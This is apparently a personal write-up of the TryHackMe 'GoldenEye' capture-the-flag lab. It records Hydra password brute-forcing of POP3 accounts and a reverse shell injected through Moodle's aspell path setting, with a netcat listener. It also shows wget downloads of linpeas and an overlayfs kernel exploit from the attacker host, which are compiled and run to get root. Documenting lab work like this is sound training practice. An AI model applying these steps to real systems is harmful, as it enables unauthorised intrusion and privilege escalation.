# Enumeration
## /etc/hosts
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ cat /etc/hosts    
127.0.0.1	localhost
127.0.1.1	bt
10.10.199.137	goldeneye.thm
```
## Ping 
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ ping goldeneye.thm  
PING goldeneye.thm (10.10.252.82) 56(84) bytes of data.
64 bytes from goldeneye.thm (10.10.252.82): icmp_seq=1 ttl=63 time=72.1 ms
64 bytes from goldeneye.thm (10.10.252.82): icmp_seq=2 ttl=63 time=72.0 ms
^C
--- goldeneye.thm ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 72.005/72.056/72.108/0.051 ms
```
## Ports scan with [[nmap]]
### Syntax
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ sudo nmap -A -p- -oN nmap_results.txt goldeneye.thm
```
Where:
- `-A` for Aggressive scan (default scripts, host enum, etc..) 
- `-p-` to scan all ports
- `-oN` output results in normal format 
### Results
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ sudo nmap -A -p- -oN nmap_results.txt goldeneye.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 21:54 EET
Nmap scan report for goldeneye.thm (10.10.252.82)
Host is up (0.072s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP UIDL CAPA PIPELINING RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS AUTH-RESP-CODE TOP UIDL CAPA RESP-CODES SASL(PLAIN) USER
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/13%OT=25%CT=1%CU=42905%PV=Y%DS=2%DC=T%G=Y%TM=63714B
OS:CF%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   71.67 ms 10.11.0.1
2   71.95 ms goldeneye.thm (10.10.252.82)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.54 seconds
```
### Notes:
- smtp is open on port 25
- http is open on port 80
- ssl/pop3 is open on port 55006
- pop3 is open port 55007
## Goldeneye.thm
![[Pasted image 20221113224541.png]]
- Reminded me of my very first ctf, which was mr.robot.
```html
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="[index.css](view-source:http://goldeneye.thm/index.css)">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="[terminal.js](view-source:http://goldeneye.thm/terminal.js)"></script>
	
</html>
```
- Going to the login directory we obtain a login form of `Username` and `Passowrd`
![[Pasted image 20221113224818.png]]
## Directory scan with [[gobuster]]
### Syntax
```sh
gobuster dir -u http://goldeneye.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
```
Where:
- `dir` to define that we're doing directory enumeration
- `-u` to define the url
- `-w` to define the wordlist used
- `-q` to present only the results
- `-o` to output the results as text file
- `-x` to include `txt,php,html,js` extensions
- `-t` threads to occupy
### Results
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ gobuster dir -u http://goldeneye.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/.htaccess            (Status: 403) [Size: 289]
/.htaccess.txt        (Status: 403) [Size: 293]
/.htaccess.php        (Status: 403) [Size: 293]
/.htaccess.html       (Status: 403) [Size: 294]
/.htaccess.js         (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 289]
/.htpasswd.txt        (Status: 403) [Size: 293]
/.htpasswd.html       (Status: 403) [Size: 294]
/.htpasswd.php        (Status: 403) [Size: 293]
/.htpasswd.js         (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 252]
/server-status        (Status: 403) [Size: 293]
/terminal.js          (Status: 200) [Size: 1349]
```
### Notes
- `/terminal.js` gives us some interesting info:
```js
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```
- Obtained usernames: `Boris` , `Natalya` , `MI6`
- Obtained passwords: `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;`
## Password decoding with [[cyberchef]]
![[Pasted image 20221113231051.png]]
- Obtained password `InvincibleHack3r`
## /sev-home login 
![[Pasted image 20221113231239.png]]
### Results:
- Login failed
- We've hit a brick wall with the website, for now. Let's check other services.
## [[pop3]] on port 55007
### [[Telnet]]
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ telnet goldeneye.thm 55007
Trying 10.10.53.238...
Connected to goldeneye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER Boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
```
## Hydra brute-force attack on boris's pop3 account
### Syntax
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ hydra -V -f -l 'boris' -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pop3://goldeneye.thm:55007

```
Where:
- `-V` to output the tries
- `-f` to stop when the correct pass is found
- `-l` Username
- `-P` Password list
- `pop3://goldeneye.thm:55007`
	- `pop3` targeted service
	- `goldeneye.thm` targeted domain
	- `55007` targeted port
### Results
- the new rockyou wordlist does contain the correct password but in line 2092279:))))
- the correct password is `secret1!`
## Telnet login using Boris's creds
```txt
sami@bt:~/Documents/THM/CTFs/goldeneye$ cat pop3_messages 
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```
Notes:
- first message: admin said: **" I'm not going to scan emails for security risks because I trust you and the other admins here. "** 
- second message: `From: natalya@ubuntu` , natalya said: **"Boris, I can break your codes!
"**
- third message: `From: alec@janus.boss` , user: `Xenia`
- Users obtained: `admin` , `natalya` , `alec` , `Xenia`
## Hydra brute-force attack on natalya's pop3 account
### Syntax
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ hydra -t 4 -V -f -l 'natalya' -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-35.txt pop3://goldeneye.thm:55007
```
### Results:
`bird`
## Telnet login using Natalya's creds
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ telnet goldeneye.thm 55007
Trying 10.10.199.137...
Connected to goldeneye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```
- Users obtained: `Janus` 
- Passowrds obtained: `xenia` : `RCP90rulez!`
- Other info: `severnaya-station.com/gnocertdir` 
	- ![[Pasted image 20221115221337.png]]
## severnaya-station.com Enumeration
### Source code
```html
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="[index.css](view-source:http://severnaya-station.com/index.css)">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="[terminal.js](view-source:http://severnaya-station.com/terminal.js)"></script>
	
</html>
```
#### Notes:
- `terminal.js` is interesting
### Terminal JS Code
```js
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```
#### Notes:
- Same as the previous one in `goldeneye.thm`
## severnaya-station{.}com/gnocertdir
![[Pasted image 20221115221823.png]]
### Loging in as `xenia` by pressing on `Intro to GoldenEye`
![[Pasted image 20221115222050.png]]
### `xenia`'s public profile
![[Pasted image 20221115222344.png]]
- Email: `xen@contrax.mil`
- Country: `Austria`
- City/Town: `Many`
### Add a new entry tab
![[Pasted image 20221115222548.png]]
### Messages tab
![[Pasted image 20221115223257.png]]
"Tuesday, 24 April 2018

09:24 PM: Greetings Xenia,  
  
As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.  
  
My email username is...  
  
doak  
  
Thank you,  
  
Cheers,  
  
Dr. Doak "The Doctor"  
Training Scientist - Sr Level Training Operating Supervisor  
GoldenEye Operations Center Sector  
Level 14 - NO2 - id:998623-1334  
Campus 4, Building 57, Floor -8, Sector 6, cube 1,007  
Phone 555-193-826  
Cell 555-836-0944  
Office 555-846-9811  
Personal 555-826-9923  
Email: doak@  
Please Recycle before you print, Stay Green aka save the company money!  
"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy  
"You miss 100% of the shots you don't shoot at" - Wayne G.  
THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS."
- Obtained creds:
	- Username: `doak` 
## Hydra brute-force attack on natalya's pop3 account
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ hydra -f -l 'doak' -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pop3://goldeneye.thm:55007
```
### Results:
`goat`
## Telnet login using Doak's creds
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ telnet goldeneye.thm 55007
Trying 10.10.199.137...
Connected to goldeneye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
quit
+OK Logging out.
Connection closed by foreign host.
```
- Obtained credentials:  `dr_doak`:`4England!` , `James`.
## Moodle login using doak's creds
![[Pasted image 20221115225328.png]]
### Doak's profile
![[Pasted image 20221115225555.png]]
- Country: Croatia
- City/town: split
- Email address: dualRCP90s@na.goldeneye
### Doak's private files
![[Pasted image 20221115230007.png]]
## Inspecting s3cret.txt
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.                                                             
```
- Obtained info:
	- `admin` creds were captured in clear text.
	-  `/dir007key/for-007.jpg`
	- `License to Kill is the only way to play` 
## /dir007key/for-007.jpg
![[Pasted image 20221115230824.png]]
- Stenography 
## exiftool against `for-007.jpg`
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ exiftool for-007.jpg          
ExifTool Version Number         : 12.49
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2022:11:15 23:07:05+02:00
File Access Date/Time           : 2022:11:15 23:07:19+02:00
File Inode Change Date/Time     : 2022:11:15 23:07:05+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```
### Notes:
- base64 encoded text: `eFdpbnRlcjE5OTV4IQ==`
## base64 decoding against `eFdpbnRlcjE5OTV4IQ==`
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d 
xWinter1995x!
```
### Notes:
- password: `admin` : `xWinter1995x!`
## Telnet login using admin creds
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ telnet goldeneye.thm 55007
Trying 10.10.199.137...
Connected to goldeneye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER admin
+OK
PASS xWinter1995x!
-ERR [AUTH] Authentication failed.
```
## Moodle login using admin's creds
![[Pasted image 20221115231623.png]]
## Manipulating the `system paths` and the Spell engine
![[Pasted image 20221115235943.png]]
### Notes:
To use spell-checking within the editor, you MUST have **aspell 0.50** or later installed on your server, and you must specify the correct path to access the aspell binary. On Unix/Linux systems, this path is usually **/usr/bin/aspell**, but it might be something else.
- [[Python Reverse Shell]] payload in `Path to aspell`
- Spell engine changed from `Google Spell` to `PSpellShell`
## python reverse shell 
![[Pasted image 20221116000520.png]]
```sh
sami@bt:~/Documents/THM/CTFs/goldeneye$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.199.137] 55372
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Finally, a shell.
# Post-Exploit Enum
## [[Upgrade The Shell]] with python
```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/home$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/home$ ls
ls
boris  doak  natalya
www-data@ubuntu:/home$ 
```
## Manual enumeration
```sh
www-data@ubuntu:/home$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
www-data@ubuntu:/home/boris$ cat .bash_history
cat .bash_history
sudo -i
shutdown
exit
vim /etc/issue
sudo -i
exit
sudo -i
exit
www-data@ubuntu:/etc$ ls -hla issue
ls -hla issue
-rw-r--r-- 1 root root 41 Apr 27  2018 issue
www-data@ubuntu:/etc$ file issue
file issue
issue: ASCII text
www-data@ubuntu:/etc$ 
www-data@ubuntu:/etc$ cat issue
cat issue
GoldenEye Systems **TOP SECRET**  \n \l
```
### Uploading and running linpeas.sh
```sh
www-data@ubuntu:/tmp$ wget http://10.11.4.14:8001/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
.sh && ./linpeas.sh.14:8001/linpeas.sh && chmod +x linpeas 
--2022-11-15 14:17:02--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'
```
### Linpeas.sh results
```sh 
OS: Linux version 3.13.0-32-generic

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292
```
### Which compiler do we have on the machine?
```sh
www-data@ubuntu:/tmp$ which gcc
which gcc
www-data@ubuntu:/tmp$ which cc
which cc
/usr/bin/cc
```
### Modifying the exploit
from
```c
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```
to
```c
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```
### Uploading the exploit
Attacking machine
```sh
sami@bt:~/Documents/THM/CTFs/b3dr0ck$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.199.137 - - [16/Nov/2022 00:44:43] "GET /exploit.c HTTP/1.1" 200 -
```
Target machine
```sh
www-data@ubuntu:/tmp$ wget http://10.11.4.14:8001/exploit.c
wget http://10.11.4.14:8001/exploit.c
--2022-11-15 14:44:42--  http://10.11.4.14:8001/exploit.c
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: 'exploit.c'

100%[======================================>] 4,968       --.-K/s   in 0s      

2022-11-15 14:44:43 (91.1 MB/s) - 'exploit.c' saved [4968/4968]
```
### Compiling the exploit with cc
```sh
www-data@ubuntu:/tmp$ cc exploit.c -o exploit
cc exploit.c -o exploit
exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ls -hla
ls -hla
total 872K
drwxrwxrwt  4 root     root     4.0K Nov 15 14:48 .
drwxr-xr-x 22 root     root     4.0K Apr 24  2018 ..
drwxrwxrwt  2 root     root     4.0K Nov 15 11:10 .ICE-unix
drwxrwxrwt  2 root     root     4.0K Nov 15 11:10 .X11-unix
-rwxrwxrwx  1 www-data www-data  14K Nov 15 14:47 a.out
-rwxrwxrwx  1 www-data www-data  14K Nov 15 14:48 exploit
-rw-rw-rw-  1 www-data www-data 4.9K Nov 15 14:44 exploit.c
-rwxrwxrwx  1 www-data www-data 809K Oct 22 08:09 linpeas.sh
-rw-------  1 www-data www-data   13 Nov 15 14:03 tinyspellzydTZO
```
### Running the exploit
```sh
www-data@ubuntu:/tmp$ ./exploit      
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root
```
## [[find]] the flag
```sh
# find / -type f -name .flag.txt 2>/dev/null
find / -type f -name .flag.txt 2>/dev/null
/root/.flag.txt
# cat /root/.flag.txt**007**
If you captured this make sure to go here.....
/006-final/xvf7-flag/
```
## /006-final/xvf7-flag/
![[Pasted image 20221116005537.png]]
# Done :D